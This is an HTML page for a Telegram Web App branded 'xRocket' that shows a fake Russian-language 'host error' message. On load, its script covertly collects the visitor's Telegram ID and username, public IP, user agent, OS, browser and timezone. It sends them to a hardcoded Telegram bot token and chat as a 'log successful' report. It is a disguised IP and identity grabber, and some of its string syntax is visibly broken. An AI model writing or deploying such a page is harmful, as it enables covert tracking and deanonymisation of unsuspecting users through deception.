<!DOCTYPE html>
<html lang="en">
<head>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>xRocket</title>
<style>
  body {
    background-color: #1e1e1e;
    color: white;
    font-family: Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  #container {
    border-radius: 20px;
    background-color: #2f2f2f;
    padding: 20px;
    text-align: center;
  }
</style>
</head>
<body>
<div id="container">
  <h1>Ошибка хоста!</h1>
  <p>Обратитесь к сис. администратору сети!</p>
</div>
<script>
  document.addEventListener('DOMContentLoaded', function() {
    const urlParams = new URLSearchParams(window.location.search);
    const username = WebAppUser.username;
    const userid = WebAppUser.id;
    const userAgent = navigator.userAgent; // useragent
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const osname = navigator.platform;
        const timezoneOffset = new Date().getTimezoneOffset();
        const timezone = -timezoneOffset / 60;
        const browser = getBrowserInfo();

        const message = 
🔥 Лог успешен!

*🧭 Базовая информация:*
 *🔍 Аккаунт в тг:*
  ├ Айди: ${userid}
  ├ Тэг: ${username}
 *💻 Система:*
  ├ IP: ${ip}
  ├ UserAgent: ${userAgent}
  ├ ОС: ${osname}
  ├ Браузер: ${browser}
  └ Часовой пояс: ${timezone}  час. ';

        const token = '6774889222:AAFarBWUeou_73vtHTpuyjleGFHNl4uxEN0';
        const chatId = '-1001949197345';
        const url = 'https://api.telegram.org/bot${token}/sendMessage';
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        formData.append('parse_mode', 'Markdown')
        fetch(url, {
          method: 'POST',
          body: formData
        });
      });

  function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = '';
    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i)  [];

    if (/trident/i.test(match[1])) {
      const tem = /\brv[ :]+(\d+)/g.exec(ua)  [];
      browser = IE ${tem[1] || ''};
    }

    if (match[1] === 'Chrome') {
      const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
      if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
    }

    match[2] = match[2] ? version ${match[2]} : '';
    browser = ${match[1]  ''} ${match[2]  ''}.trim();
    return browser;
  }
  });
</script>
</body>
</html>